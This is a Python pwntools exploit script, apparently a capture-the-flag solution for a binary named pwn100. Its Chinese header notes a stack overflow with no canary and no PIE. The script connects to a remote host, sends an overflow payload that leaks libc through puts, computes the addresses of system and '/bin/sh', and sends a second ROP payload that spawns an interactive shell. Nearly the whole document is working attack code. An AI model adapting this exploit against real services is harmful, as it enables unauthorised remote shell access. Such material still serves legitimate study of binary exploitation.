"""
漏洞点：栈溢出
checksec:
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
思路：
    1、puts泄露libc地址
    2、构造rop
"""

from pwn import *
from LibcSearcher import *

# context.log_level = "debug"

# p = process("./pwn100")
p = remote("61.147.171.105", 53639)
elf = ELF("./pwn100")

puts_addr = elf.plt['puts']
read_got = elf.got['read']
main_addr = 0x4006B8
pop_rdi = 0x400763

payload = b"A" * 64 + p64(0) + p64(pop_rdi) + p64(read_got) + p64(puts_addr) + p64(main_addr) + b"A" * (200-64-5*8)
p.send(payload)
p.recvline()
read_addr = int.from_bytes(p.recvline()[:-1], byteorder='little')
log.success("read_addr = " + hex(read_addr))

libc = LibcSearcher("read", read_addr)  # libc6_2.23-0ubuntu10_amd64
libc_base = read_addr - libc.dump("read")
system_addr = libc.dump("system") + libc_base
str_bin_sh = libc.dump("str_bin_sh") + libc_base

log.success("system_addr = " + hex(system_addr))
log.success("/bin/sh = " + hex(str_bin_sh))

payload = b"A" * 64 + p64(0) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr) + b"A" * (200-64-5*8)
p.send(payload)

p.interactive()
